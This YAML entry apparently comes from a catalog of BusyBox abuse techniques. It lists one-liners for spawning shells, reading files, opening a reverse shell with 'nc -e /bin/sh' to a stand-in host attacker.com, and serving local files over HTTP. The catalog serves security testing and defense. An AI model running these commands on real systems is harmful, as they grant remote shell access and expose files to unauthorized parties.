---
comment: |-
  BusyBox may contain many utilities, run `busybox --list-full` to check what other binaries are supported.
functions:
  inherit:
  - code: |-
      busybox ash
    contexts:
      sudo:
      unprivileged:
    from: ash
  - code: |-
      busybox cat
    contexts:
      sudo:
      unprivileged:
    from: cat
  reverse-shell:
  - code: |-
      busybox nc -e /bin/sh attacker.com 12345
    contexts:
      sudo:
      unprivileged:
    listener: tcp-server
  upload:
  - code: |-
      busybox httpd -f -p 12345 -h .
    comment: |-
      This serves files in the local folder via an HTTP server.
    contexts:
      sudo:
      unprivileged:
    receiver: http-client
...
